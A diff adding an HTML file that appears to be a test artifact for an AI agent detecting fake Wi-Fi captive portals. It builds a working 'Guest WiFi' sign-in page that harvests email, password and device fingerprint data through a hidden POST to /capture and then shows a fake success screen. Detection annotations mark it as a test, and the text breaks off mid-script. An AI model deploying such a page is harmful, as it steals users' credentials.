@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<!--
+  wscanplus Test Portal v1.2
+  Artifact ID    : wscanplus-portal-test-001
+  Classification : FAKE_TEST_PORTAL
+  Purpose        : Gemini AI agent test harness — fake/real portal detection
+  Visual class   : Operator-grade mobile-first captive portal
+                   Matches the structural and visual class of real ISP hotspot
+                   portals without replicating any specific operator's brand.
+  Note           : Educational walkthrough and user warnings are handled
+                   in-app by Gemini. This file is a clean test artifact only.
+  Ref doc        : docs/PORTAL_REFERENCE.md
+-->
+<html lang="en"
+      data-wscanplus-artifact="true"
+      data-wscanplus-version="1.2"
+      data-wscanplus-class="FAKE_TEST_PORTAL">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta name="theme-color" content="#005baa">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!--wscanplus:meta:legitimate_operator=false-->
+<!--wscanplus:meta:capture_endpoint=true-->
+<!--wscanplus:meta:cert_authority=SELF_SIGNED_OR_NONE-->
+<!--wscanplus:meta:domain_authority=LOCAL_AP_ONLY-->
+<!--wscanplus:meta:redirect_uri=NONE-->
+<!--wscanplus:meta:session_token=ABSENT-->
+<title>Sign In — Guest WiFi</title>
+<style>
+:root{
+  --blue-dark:#005baa;
+  --blue-mid:#0072ce;
+  --blue-light:#e8f2fc;
+  --text-primary:#0d1f35;
+  --text-secondary:#4a6078;
+  --text-hint:#8fa3b5;
+  --border:#d0dbe8;
+  --bg:#f2f5f9;
+  --white:#ffffff;
+  --green:#0f9d58;
+  --red:#d93025;
+  --radius-card:12px;
+  --radius-input:8px;
+  --radius-btn:8px;
+  --shadow-card:0 1px 6px rgba(0,0,0,.12),0 2px 12px rgba(0,91,170,.08);
+}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+html{height:100%;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;
+  background:var(--bg);color:var(--text-primary);
+  min-height:100%;display:flex;flex-direction:column;align-items:center;
+  padding-bottom:env(safe-area-inset-bottom,24px);
+}
+
+/* ── Top bar — operator style ── */
+.topbar{
+  width:100%;background:var(--blue-dark);
+  padding:0;display:flex;flex-direction:column;
+  box-shadow:0 2px 4px rgba(0,0,0,.2);
+  position:sticky;top:0;z-index:10;
+}
+.topbar-inner{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:12px 16px 11px;
+}
+.topbar-brand{
+  display:flex;align-items:center;gap:10px;
+}
+.topbar-logo{
+  width:36px;height:36px;background:var(--white);
+  border-radius:6px;display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;
+}
+.topbar-logo svg{width:22px;height:22px;fill:var(--blue-dark)}
+.topbar-name{
+  color:var(--white);
+  font-size:16px;font-weight:700;letter-spacing:-.2px;line-height:1.1;
+}
+.topbar-tagline{
+  color:rgba(255,255,255,.75);font-size:11px;margin-top:1px;
+}
+.topbar-secure{
+  display:flex;align-items:center;gap:4px;
+  background:rgba(255,255,255,.12);border-radius:20px;
+  padding:4px 10px;
+}
+.topbar-secure svg{width:12px;height:12px;fill:rgba(255,255,255,.85)}
+.topbar-secure span{font-size:11px;color:rgba(255,255,255,.85);font-weight:500}
+
+/* Network status bar */
+.netbar{
+  background:rgba(0,0,0,.25);
+  padding:6px 16px;
+  display:flex;align-items:center;justify-content:space-between;
+}
+.netbar-ssid{
+  display:flex;align-items:center;gap:6px;
+  font-size:11.5px;color:rgba(255,255,255,.9);font-weight:500;
+}
+.netbar-ssid svg{width:13px;height:13px;fill:rgba(255,255,255,.8)}
+.netbar-status{
+  display:flex;align-items:center;gap:5px;
+  font-size:11px;color:rgba(255,255,255,.75);
+}
+.dot-pending{
+  width:6px;height:6px;border-radius:50%;
+  background:#f5a623;animation:blink 1.4s ease infinite;
+}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.4}}
+
+/* ── Page content ── */
+.page{width:100%;max-width:420px;padding:16px 14px 0;}
+
+/* ── Notice bar — auth required ── */
+.notice{
+  background:#fff8e6;border:1px solid #f5c842;
+  border-radius:var(--radius-card);padding:10px 14px;
+  display:flex;align-items:flex-start;gap:9px;margin-bottom:14px;
+}
+.notice svg{width:16px;height:16px;fill:#c8960a;flex-shrink:0;margin-top:1px}
+.notice-text{font-size:12.5px;color:#6b4e00;line-height:1.5}
+.notice-text strong{font-weight:700}
+
+/* ── Card ── */
+.card{
+  background:var(--white);border-radius:var(--radius-card);
+  box-shadow:var(--shadow-card);overflow:hidden;margin-bottom:14px;
+}
+.card-head{
+  padding:14px 16px 13px;
+  border-bottom:1px solid #edf1f6;
+  display:flex;align-items:center;gap:10px;
+}
+.card-head-icon{
+  width:38px;height:38px;border-radius:8px;
+  background:var(--blue-light);flex-shrink:0;
+  display:flex;align-items:center;justify-content:center;
+}
+.card-head-icon svg{width:20px;height:20px;fill:var(--blue-dark)}
+.card-head-text h2{font-size:15px;font-weight:700;color:var(--text-primary)}
+.card-head-text p{font-size:12px;color:var(--text-secondary);margin-top:1px}
+.card-body{padding:16px;}
+.card-footer{
+  padding:12px 16px;background:#f7f9fc;
+  border-top:1px solid #edf1f6;
+  font-size:11.5px;color:var(--text-hint);line-height:1.5;
+}
+
+/* ── Form elements ── */
+.field{margin-bottom:14px}
+.field:last-child{margin-bottom:0}
+.field-label{
+  display:block;font-size:12px;font-weight:600;
+  color:var(--text-secondary);margin-bottom:5px;letter-spacing:.1px;
+}
+.field-label .req{color:var(--red);margin-left:2px}
+.field-input{
+  width:100%;border:1.5px solid var(--border);
+  border-radius:var(--radius-input);padding:12px 14px;
+  font-size:16px;color:var(--text-primary);background:var(--white);
+  outline:none;-webkit-appearance:none;appearance:none;
+  transition:border-color .15s,box-shadow .15s;
+  /* 16px prevents iOS zoom on focus */
+}
+.field-input:focus{
+  border-color:var(--blue-mid);
+  box-shadow:0 0 0 3px rgba(0,114,206,.14);
+}
+.field-input.invalid{border-color:var(--red)}
+.field-input::placeholder{color:var(--text-hint)}
+.field-hint{font-size:11.5px;color:var(--text-hint);margin-top:4px;line-height:1.4}
+.field-error{font-size:11.5px;color:var(--red);margin-top:4px;display:none;line-height:1.4}
+.field-error.show{display:block}
+
+/* Input with icon */
+.field-input-wrap{position:relative}
+.field-input-wrap .field-input{padding-left:40px}
+.field-input-wrap .input-icon{
+  position:absolute;left:13px;top:50%;transform:translateY(-50%);
+  width:16px;height:16px;fill:var(--text-hint);pointer-events:none;
+}
+
+/* ── OR divider ── */
+.or-row{
+  display:flex;align-items:center;gap:10px;margin:14px 0;
+}
+.or-row hr{flex:1;border:none;border-top:1px solid var(--border)}
+.or-row span{font-size:12px;color:var(--text-hint);white-space:nowrap}
+
+/* ── Guest button ── */
+.btn-guest{
+  width:100%;padding:12px;border:1.5px solid var(--border);
+  background:var(--white);border-radius:var(--radius-btn);
+  font-size:14px;font-weight:600;color:var(--text-secondary);
+  cursor:pointer;-webkit-appearance:none;appearance:none;
+  display:flex;align-items:center;justify-content:center;gap:7px;
+  transition:background .12s,border-color .12s;
+}
+.btn-guest:active{background:#f2f5f9}
+.btn-guest svg{width:16px;height:16px;fill:var(--text-secondary)}
+
+/* ── ToS section ── */
+.tos-scroll{
+  background:#f7f9fc;border:1px solid #e4ebf3;
+  border-radius:var(--radius-input);padding:12px 13px;
+  height:100px;overflow-y:auto;
+  font-size:11.5px;line-height:1.75;color:var(--text-secondary);
+  -webkit-overflow-scrolling:touch;
+}
+.tos-scroll h4{font-size:12px;font-weight:700;color:var(--text-primary);margin-bottom:6px}
+.tos-scroll p{margin-bottom:7px}
+.tos-scroll p:last-child{margin-bottom:0}
+.tos-check-row{
+  display:flex;align-items:flex-start;gap:10px;margin-top:13px;cursor:pointer;
+}
+.tos-check-row input[type=checkbox]{
+  width:18px;height:18px;flex-shrink:0;margin-top:1px;
+  accent-color:var(--blue-dark);cursor:pointer;
+}
+.tos-check-label{font-size:13px;color:var(--text-secondary);line-height:1.5}
+.tos-check-label a{color:var(--blue-mid);text-decoration:none;font-weight:600}
+
+/* ── Connect button ── */
+.btn-connect{
+  width:100%;padding:15px;
+  background:var(--blue-dark);
+  color:var(--white);border:none;border-radius:var(--radius-btn);
+  font-size:16px;font-weight:700;letter-spacing:.1px;
+  cursor:pointer;-webkit-appearance:none;appearance:none;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  box-shadow:0 2px 8px rgba(0,91,170,.3);
+  transition:background .12s,transform .08s,box-shadow .12s;
+  /* full-width tap target for mobile */
+}
+.btn-connect:active{
+  background:#004d94;transform:scale(.985);
+  box-shadow:0 1px 4px rgba(0,91,170,.2);
+}
+.btn-connect:disabled{
+  background:#8fb6d8;box-shadow:none;cursor:not-allowed;transform:none;
+}
+.btn-connect svg{width:18px;height:18px;fill:var(--white)}
+.spinner{
+  display:none;width:18px;height:18px;
+  border:2.5px solid rgba(255,255,255,.35);
+  border-top-color:var(--white);border-radius:50%;
+  animation:spin .65s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* ── Help links ── */
+.help-row{
+  display:flex;align-items:center;justify-content:center;gap:20px;
+  padding:14px 0 2px;
+}
+.help-link{
+  font-size:12.5px;color:var(--blue-mid);text-decoration:none;font-weight:500;
+  display:flex;align-items:center;gap:4px;
+}
+.help-link svg{width:13px;height:13px;fill:var(--blue-mid)}
+
+/* ── Success screen ── */
+#success-screen{
+  display:none;flex-direction:column;align-items:center;
+  justify-content:center;padding:32px 20px;text-align:center;width:100%;
+  max-width:420px;
+}
+.success-icon{
+  width:68px;height:68px;border-radius:50%;
+  background:var(--green);
+  display:flex;align-items:center;justify-content:center;margin-bottom:16px;
+  box-shadow:0 4px 16px rgba(15,157,88,.28);animation:pop .38s ease;
+}
+@keyframes pop{
+  0%{transform:scale(.5);opacity:0}
+  75%{transform:scale(1.08)}
+  100%{transform:scale(1);opacity:1}
+}
+.success-icon svg{width:34px;height:34px;fill:var(--white)}
+.success-title{font-size:20px;font-weight:700;color:var(--text-primary)}
+.success-sub{
+  font-size:13px;color:var(--text-secondary);
+  margin-top:7px;line-height:1.6;max-width:260px;
+}
+.session-card{
+  margin-top:18px;width:100%;background:var(--white);
+  border:1px solid #c8e6c9;border-radius:var(--radius-card);
+  padding:13px 15px;font-size:12.5px;color:#1b5e20;text-align:left;
+  box-shadow:0 1px 4px rgba(15,157,88,.1);
+}
+.session-card-row{
+  display:flex;justify-content:space-between;
+  padding:3px 0;border-bottom:1px solid rgba(15,157,88,.1);
+}
+.session-card-row:last-child{border-bottom:none}
+.sk{font-weight:600;opacity:.7}
+.sv{font-weight:500;text-align:right;max-width:55%;}
+
+/* ── Footer ── */
+.page-footer{
+  font-size:11px;color:var(--text-hint);text-align:center;
+  padding:14px 20px 20px;line-height:1.7;width:100%;max-width:420px;
+}
+.page-footer a{color:var(--text-hint);text-decoration:none}
+.page-footer a:hover{text-decoration:underline}
+</style>
+</head>
+<body>
+
+<!-- ── Top bar ── -->
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="topbar-brand">
+      <div class="topbar-logo">
+        <svg viewBox="0 0 24 24">
+          <path d="M1 9l2 2c5.5-5.5 14.5-5.5 20 0l2-2C19 3.5 9 3.5 1 9zm8 8l3 3 3-3c-1.7-1.7-4.3-1.7-6 0zm-4-4l2 2c2.8-2.8 7.2-2.8 10 0l2-2C15 9 9 9 5 13z"/>
+        </svg>
+      </div>
+      <div>
+        <div class="topbar-name">Guest WiFi</div>
+        <div class="topbar-tagline">Complimentary Hotspot Access</div>
+      </div>
+    </div>
+    <div class="topbar-secure">
+      <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+      <span>Secure</span>
+    </div>
+  </div>
+  <div class="netbar">
+    <div class="netbar-ssid">
+      <svg viewBox="0 0 24 24"><path d="M1 9l2 2c5.5-5.5 14.5-5.5 20 0l2-2C19 3.5 9 3.5 1 9zm8 8l3 3 3-3c-1.7-1.7-4.3-1.7-6 0zm-4-4l2 2c2.8-2.8 7.2-2.8 10 0l2-2C15 9 9 9 5 13z"/></svg>
+      <span id="ssid-display">Guest_WiFi</span>
+    </div>
+    <div class="netbar-status">
+      <div class="dot-pending" id="status-dot"></div>
+      <span id="status-text">Authentication required</span>
+    </div>
+  </div>
+</div>
+
+<!-- ── Page content ── -->
+<div class="page">
+
+  <!-- Auth required notice -->
+  <div class="notice"
+       data-wscanplus-element="notice"
+       data-wscanplus-signal="generic_branding,no_operator_domain_reference">
+    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+    <div class="notice-text">
+      <strong>Sign in required.</strong> You must authenticate to access the internet on this network.
+      Your session will begin immediately after sign-in.
+    </div>
+  </div>
+
+  <form id="portal-form" autocomplete="off" onsubmit="return false">
+
+    <!-- Sign in card -->
+    <div class="card"
+         data-wscanplus-element="credential_form"
+         data-wscanplus-signal="posts_to_non_authoritative_endpoint,no_csrf_token,no_session_token">
+
+      <div class="card-head">
+        <div class="card-head-icon">
+          <svg viewBox="0 0 24 24"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>
+        </div>
+        <div class="card-head-text">
+          <h2>Sign In to Continue</h2>
+          <p>Use your account credentials below</p>
+        </div>
+      </div>
+
+      <div class="card-body">
+
+        <!-- Email -->
+        <div class="field"
+             data-wscanplus-field="email"
+             data-wscanplus-signal="credential_harvest_target">
+          <label class="field-label" for="field-email">
+            Email Address <span class="req">*</span>
+          </label>
+          <div class="field-input-wrap">
+            <svg class="input-icon" viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+            <input class="field-input" type="email" id="field-email"
+                   name="email" placeholder="your@email.com"
+                   inputmode="email" autocomplete="email"
+                   data-wscanplus-capture="true">
+          </div>
+          <div class="field-error" id="err-email">Please enter a valid email address.</div>
+        </div>
+
+        <!-- Password — type=text is a fake-portal detection signal -->
+        <div class="field"
+             data-wscanplus-field="password"
+             data-wscanplus-signal="input_type_text_not_password,credential_harvest_target">
+          <label class="field-label" for="field-pass">Password / Access Code</label>
+          <div class="field-input-wrap">
+            <svg class="input-icon" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+            <input class="field-input" type="text" id="field-pass"
+                   name="password" placeholder="Leave blank for guest access"
+                   autocomplete="off"
+                   data-wscanplus-capture="true">
+          </div>
+          <div class="field-hint">No account? Leave blank to continue as a guest.</div>
+        </div>
+
+        <!--wscanplus:field:session_token=ABSENT-->
+        <!--wscanplus:field:redirect_uri=ABSENT-->
+        <!--wscanplus:field:mac_address_hint=ABSENT-->
+        <!--wscanplus:field:operator_account_id=ABSENT-->
+
+        <!-- OR / Guest -->
+        <div class="or-row"><hr><span>or</span><hr></div>
+
+        <button class="btn-guest" type="button" onclick="guestAccess()">
+          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+          Continue as Guest
+        </button>
+
+      </div>
+
+      <div class="card-footer">
+        Signing in confirms you agree to the network terms below.
+      </div>
+    </div>
+
+    <!-- ToS card -->
+    <div class="card"
+         data-wscanplus-element="tos"
+         data-wscanplus-signal="generic_tos_no_operator_identity">
+      <div class="card-head">
+        <div class="card-head-icon">
+          <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
+        </div>
+        <div class="card-head-text">
+          <h2>Terms of Service</h2>
+          <p>Read and accept to continue</p>
+        </div>
+      </div>
+      <div class="card-body">
+        <div class="tos-scroll">
+          <h4>Guest Network Terms &amp; Conditions</h4>
+          <p>By connecting to this network you agree to the following terms. This network is provided as a courtesy service and may be monitored for security and compliance purposes. Unauthorized or illegal use is strictly prohibited and may be reported to appropriate authorities.</p>
+          <p>You agree not to use this network to transmit unlawful, harmful, threatening, abusive, harassing, defamatory, or otherwise objectionable content. Bandwidth-intensive activities including peer-to-peer file sharing, large file transfers, and continuous high-definition streaming may be restricted or throttled.</p>
+          <p>The network operator reserves the right to terminate your session at any time and without notice. Daily session duration and data usage may be limited. Reconnection may require re-authentication. By proceeding you acknowledge you have read and agree to these terms in their entirety.</p>
+          <p>All network activity including websites visited, data transferred, and connection timestamps may be logged for security, legal compliance, and network management purposes. Your device's MAC address and device type will be recorded as part of your authenticated session record.</p>
+        </div>
+        <label class="tos-check-row" for="tos-check">
+          <input type="checkbox" id="tos-check" name="tos_accepted">
+          <span class="tos-check-label">
+            I have read and agree to the <a href="#">Terms of Service</a>
+            and <a href="#">Privacy Policy</a>. I understand this network
+            is monitored and my session may be recorded.
+          </span>
+        </label>
+        <div class="field-error" id="err-tos">Please accept the terms to continue.</div>
+      </div>
+    </div>
+
+    <!-- Connect button -->
+    <button class="btn-connect" type="button" id="btn-connect"
+            onclick="submitPortal()"
+            data-wscanplus-element="submit_button"
+            data-wscanplus-signal="posts_to_capture_not_radius_not_oauth">
+      <svg viewBox="0 0 24 24"><path d="M1 9l2 2c5.5-5.5 14.5-5.5 20 0l2-2C19 3.5 9 3.5 1 9zm8 8l3 3 3-3c-1.7-1.7-4.3-1.7-6 0zm-4-4l2 2c2.8-2.8 7.2-2.8 10 0l2-2C15 9 9 9 5 13z"/></svg>
+      <span id="btn-label">Sign In &amp; Connect</span>
+      <div class="spinner" id="btn-spinner"></div>
+    </button>
+
+    <!-- Help links -->
+    <div class="help-row">
+      <a class="help-link" href="#">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
+        Need help?
+      </a>
+      <a class="help-link" href="#">
+        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+        Contact support
+      </a>
+    </div>
+
+  </form>
+
+  <!-- Success screen -->
+  <div id="success-screen">
+    <div class="success-icon">
+      <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+    </div>
+    <div class="success-title">You're connected!</div>
+    <div class="success-sub">Your session is now active. You can begin browsing the internet.</div>
+    <div class="session-card" id="session-meta"></div>
+  </div>
+
+</div><!-- /page -->
+
+<div class="page-footer">
+  <a href="#">Privacy Policy</a> &nbsp;·&nbsp;
+  <a href="#">Terms of Use</a> &nbsp;·&nbsp;
+  <a href="#">Contact Support</a><br>
+  Session activity is monitored for security purposes.
+</div>
+
+<!-- Capture form — detection signal: POST /capture not RADIUS/OAuth -->
+<form id="capture-form" method="POST" action="/capture"
+      style="display:none"
+      data-wscanplus-element="capture_exfil_form"
+      data-wscanplus-signal="exfil_endpoint_present,not_radius_not_oauth">
+  <input type="hidden" name="ts"                    id="cap-ts">
+  <input type="hidden" name="email"                 id="cap-email">
+  <input type="hidden" name="password"              id="cap-pass">
+  <input type="hidden" name="tos"                   id="cap-tos">
+  <input type="hidden" name="guest"                 id="cap-guest">
+  <input type="hidden" name="ua"                    id="cap-ua">
+  <input type="hidden" name="platform"              id="cap-platform">
+  <input type="hidden" name="lang"                  id="cap-lang">
+  <input type="hidden" name="sw"                    id="cap-sw">
+  <input type="hidden" name="sh"                    id="cap-sh">
+  <input type="hidden" name="dpr"                   id="cap-dpr">
+  <input type="hidden" name="tz"                    id="cap-tz">
+  <input type="hidden" name="conn"                  id="cap-conn">
+  <input type="hidden" name="vendor"                id="cap-vendor">
+  <input type="hidden" name="touch"                 id="cap-touch">
+  <input type="hidden" name="mem"                   id="cap-mem">
+  <input type="hidden" name="cores"                 id="cap-cores">
+  <input type="hidden" name="ssid"                  id="cap-ssid">
+  <input type="hidden" name="wscanplus_artifact_id" value="wscanplus-portal-test-001">
+  <input type="hidden" name="wscanplus_class"       value="FAKE_TEST_PORTAL">
+  <input type="hidden" name="wscanplus_signals"     value="no_operator_logo,no_csrf_token,no_session_token,capture_endpoint_present,input_type_text_for_password,generic_branding,no_redirect_uri">
+</form>
+
+<!-- Fingerprint block — Gemini reads via GET /fingerprint or DOM parse -->
+<script id="wscanplus-fingerprint" type="application/json">
+{
+  "wscanplus_version": "1.2",
+  "artifact_id": "wscanplus-portal-test-001",
+  "classification": "FAKE_TEST_PORTAL",
+  "confidence": 1.0,
+  "detection_signals": {
+    "no_tls_cert":                  {"present":true,"weight":0.90,"description":"HTTP from local AP — no TLS cert"},
+    "no_operator_identity":         {"present":true,"weight":0.85,"description":"No ISP name, logo, or verified domain"},
+    "capture_endpoint":             {"present":true,"weight":0.95,"description":"POST /capture — not RADIUS or OAuth"},
+    "no_session_token":             {"present":true,"weight":0.80,"description":"No CSRF or session token"},
+    "no_redirect_uri":              {"present":true,"weight":0.75,"description":"No post-auth redirect"},
+    "password_field_type_text":     {"present":true,"weight":0.88,"description":"type=text not type=password"},
+    "domain_is_local_ip":           {"present":true,"weight":0.92,"description":"Local AP IP not operator domain"},
+    "no_mac_address_hint":          {"present":true,"weight":0.70,"description":"No MAC field for RADIUS binding"},
+    "no_operator_account_id":       {"present":true,"weight":0.72,"description":"No operator account binding"},
+    "wscanplus_annotation_present": {"present":true,"weight":1.00,"description":"data-wscanplus attributes — definitive test artifact"},
+    "generic_tos":                  {"present":true,"weight":0.60,"description":"Generic ToS, no operator identity"}
+  },
+  "legitimate_portal_signals_absent": [
+    "TLS certificate from trusted CA",
+    "Registered operator domain",
+    "RADIUS or OAuth 2.0 / WISPr auth flow",
+    "CSRF / session token",
+    "Post-auth redirect URI",
+    "Client MAC binding field",
+    "Verified operator brand identity",
+    "Operator-specific ToS with contact info"
+  ],
+  "aggregate_fake_score": 0.96,
+  "verdict": "FAKE — test artifact"
+}
+</script>
+
+<script>
+window.wscanplusFingerprint = JSON.parse(
+  document.getElementById("wscanplus-fingerprint").textContent
+);
+
+function collectAnalytics() {
+  var nav  = window.navigator;
+  var scr  = window.screen;
+  var conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
+  return {
+    ts:       new Date().toISOString(),
+    ua:       nav.userAgent           || "",
+    platform: nav.platform            || "",
+    lang:     nav.language            || "",
+    sw:       scr.width               || 0,
+    sh:       scr.height              || 0,
+    dpr:      window.devicePixelRatio || 1,
+    tz:       Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+    conn:     conn.effectiveType      || conn.type || "",
+    vendor:   nav.vendor              || "",
+    touch:    ("ontouchstart" in window) ? "yes" : "no",
+    mem:      nav.deviceMemory        || "",
+    cores:    nav.hardwareConcurrency || ""
+  };
+}
+
+function buildFeedback(a, fd) {
+  return {
+    record_type:    "wscanplus_portal_capture",
+    artifact_id:    "wscanplus-portal-test-001",
+    classification: "FAKE_TEST_PORTAL",
+    session:        {timestamp: a.ts, ssid: document.getElementById("ssid-display").textContent},
+    form_submission:{email_present: fd.email.length > 0, password_present: fd.pass.length > 0, guest_path: fd.guest, tos_accepted: fd.tos},
+    device_analytics:{user_agent: a.ua, platform: a.platform, language: a.lang, screen: a.sw+"x"+a.sh, pixel_ratio: a.dpr, timezone: a.tz, connection: a.conn, vendor: a.vendor, touch: a.touch, memory_gb: a.mem, cpu_cores: a.cores},
+    detection_signals_fired: window.wscanplusFingerprint.detection_signals,
+    aggregate_fake_score:    window.wscanplusFingerprint.aggregate_fake_score,
+    verdict:                 window.wscanplusFingerprint.verdict
+  };
+}
+
+// Populate SSID from URL param
+(function(){
+  try {
+    var p = new URLSearchParams(window.location.search);
+    var s = p.get("ssid") || p.get("network");
+    if(s && s.length < 33){
+      document.getElementById("ssid-display").textContent = s;
+      document.getElementById("cap-ssid").value = s;
+    }
+  } catch(e){}
+})();
+
+function showErr(id, show){
+  var el = document.getElementById(id);
+  if(el) el.className = show ? "field-error show" : "field-error";
+}
+function setInv(id, v){
+  var el = document.getElementById(id);
+  if(el){if(v) el.classList.add("invalid"); else el.classList.remove("invalid");}
+}
+
+function showSuccess(a, isGuest){
+  document.getElementById("portal-form").style.display = "none";
+  var ss = document.getElementById("success-screen");
+  ss.style.display = "flex";
+  document.getElementById("session-meta").innerHTML =
+    "<div class='session-card-row'><span class='sk'>Connected</span><span class='sv'>"    + new Date().toLocaleTimeString()                                                    + "</span></div>" +
+    "<div class='session-card-row'><span class='sk'>Session type</span><span class='sv'>" + (isGuest ? "Guest" : "Authenticated")                                              + "</span></div>" +
+    "<div class='session-card-row'><span class='sk'>Device</span><span class='sv'>"       + (a.platform || "Unknown")                                                          + "</span></div>" +
+    "<div class='session-card-row'><span class='sk'>Network</span><span class='sv'>"      + (document.getElementById("ssid-display").textContent)                             + "</span></div>" +
+    "<div class='session-card-row'><span class='sk'>Connection</span><span class='sv'>"   + (a.conn || "WiFi")                                                                 + "</span></div>" +
+    "<div class='session-card-row'><span class='sk'>Verdict</span><span class='sv'>FAKE (TEST)</span></div>";
+  var dot = document.getElementById("status-dot");
+  if(dot){dot.style.background="#0f9d58";dot.style.animation="none";}
+  var st = document.getElementById("status-text");
+  if(st) st.textContent = "Connected";
+}
+
+function dispatch(email, pass, tos, isGuest){
+  var a = collectAnalytics();
+  window.wscanplusLastCapture = buildFeedback(a, {email:email, pass:pass, guest:isGuest, tos:tos});
+  document.getElementById("cap-ts").value       = a.ts;
+  document.getElementById("cap-email").value    = email;
+  document.getElementById("cap-pass").value     = pass;
+  document.getElementById("cap-tos").value      = tos ? "1" : "0";
+  document.getElementById("cap-guest").value    = isGuest ? "1" : "0";
+  document.getElementById("cap-ua").value       = a.ua;
+  document.getElementById("cap-platform").value = a.platform;
+  document.getElementById("cap-lang").value     = a.lang;
+  document.getElementById("cap-sw").value       = a.sw;
+  document.getElementById("cap-sh").value       = a.sh;
+  document.getElementById("cap-dpr").value      = a.dpr;
+  document.getElementById("cap-tz").value       = a.tz;
+  document.getElementById("cap-conn").value     = a.conn;
+  document.getElementById("cap-vendor").value   = a.vendor;
+  document.getElementById("cap-touch").value    = a.touch;
+  document.getElementById("cap-mem").value      = a.mem;
+  document.getElementById("cap-cores").value    = a.cores;
+  document.getElementById("capture-form").submit();
+  setTimeout(function(){ showSuccess(a, isGuest); }, 2000);
+}
+
+// Guest path — skips credential fields, still captures analytics
+function guestAccess(){
+  if(!document.getElementById("tos-check").checked){
+    showErr("err-tos", true); return;
+  }
+  showErr("err-tos", false);
+  var btn = document.getElementById("btn-connect");
+  btn.disabled = true;
+  document.getElementById("btn-label").textContent = "Connecting...";
+  document.getElementById("btn-spinner").style.display = "block";
+  dispatch("", "", true, true);
+}
+
+// Sign-in path
+function submitPortal(){
+  var email = document.getElementById("field-email").value.trim();
+  var pass  = document.getElementById("field-pass").value;
+  var tos   = document.getElementById("tos-check").checked;
+  var ok    = true;
+  var eok   = !email || /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  if(!eok){showErr("err-email",true); setInv("field-email",true);  ok=false;}
+  else    {showErr("err-email",false);setInv("field-email",false);}
+  if(!tos){showErr("err-tos",true);   ok=false;}
+  else    {showErr("err-tos",false);}
+  if(!ok) return;
+  var btn = document.getElementById("btn-connect");
+  btn.disabled = true;
+  document.getElementById("btn-label").textContent = "Connecting...";
+  document.getElementById("btn-spinner").style.display = "block";
+  dispatch(email, pass, tos, false);
+}
+
+document.getElementById("field-email").addEventListener("input",function(){
+  showErr("err-email",false); setInv("field-email",false);
